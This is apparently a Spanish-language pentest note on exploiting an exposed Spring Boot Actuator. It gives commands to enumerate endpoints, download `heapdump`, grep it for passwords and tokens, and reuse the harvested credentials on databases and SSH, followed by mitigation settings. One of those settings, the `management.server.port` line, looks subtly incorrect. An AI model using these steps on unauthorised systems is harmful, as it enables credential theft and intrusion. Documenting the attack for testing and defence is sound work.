---
topic: actuator
platform: Java / Spring Boot
tags: [web, java, spring-boot, heapdump, secrets]
---

# Spring Boot Actuator y heapdump

[🇬🇧 English](actuator-heapdump.en.md) | **Español**

> Nota reutilizable. En una máquina activa, no publicar capturas con datos reales.

## Por qué importa

`/actuator` es el panel de diagnóstico de Spring Boot. Si está expuesto, no filtra "un dato": filtra el estado del proceso. El endpoint más rentable es `heapdump`, porque descarga **toda la memoria** y con ella las contraseñas que viven como cadenas (`Hikari`, `DataSource`, tokens, claves JWT).

## Detección

```bash
curl -s http://<HOST>/actuator
curl -s http://<HOST>/actuator | jq .
ffuf -u http://<HOST>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -mc 200,401,403
```

Respuesta típica:

```json
{"_links":{"self":{"href":".../actuator"},
           "health":{"href":".../actuator/health"},
           "heapdump":{"href":".../actuator/heapdump"},
           "env":{"href":".../actuator/env"}}}
```

Otros endpoints útiles: `env` (variables), `configprops`, `mappings` (todas las rutas), `loggers`, `httptrace`, `threaddump`, `sessions`, `beans`, `caches`.

```bash
for e in env configprops mappings sessions beans loggers; do
  echo "== $e"; curl -s "http://<HOST>/actuator/$e" | head -c 400; echo
done
```

## Heapdump

```bash
curl -s http://<HOST>/actuator/heapdump -o heap.hprof
file heap.hprof && ls -lh heap.hprof
```

Extracción rápida (sin herramientas):

```bash
strings -n 6 heap.hprof | grep -iE 'password|passwd|secret|token|jdbc:|http://|amqp://' | sort -u | less
```

Herramientas específicas:

- **JDumpSpider**: `java -jar JDumpSpider.jar heap.hprof` → datasources, usuarios, URLs.
- **Eclipse MAT** o **VisualVM** si hace falta ver objetos y referencias.
- `jhat`/`jmap` no sirven para un volcado ajeno; el que lo generó ya está muerto.

Buscar sobre todo: usuario y contraseña de la base de datos, URL del datasource, claves de API, cadenas que parezcan contraseñas por longitud y contexto, y el propio `-D` de arranque.

## Con las credenciales en la mano

- Probar la base de datos del datasource (`mysql`, `psql`, ClickHouse `8123`/`9000`).
- Probar **reutilización** en SSH o en el panel de administración.
- Revisar `mappings` para endpoints internos que no aparecían en el front.

## Mitigación y detección

```properties
management.endpoints.web.exposure.include=health
management.endpoint.heapdump.enabled=false
management.endpoint.heapdump.access=none
management.server.port=127.0.0.1:9090
```

- Actuator en interfaz local o tras autenticación.
- Contraseñas con rotación y distintos clicks por servicio (que un volcado no abra tres puertas).
- Detección: peticiones a `/actuator/*` desde fuera de la red de gestión y descargas de varios MB a `/actuator/heapdump`.

## Referencias

- <https://docs.spring.io/spring-boot/api/rest/actuator/heapdump.html>
- <https://github.com/whwlsfb/JDumpSpider>
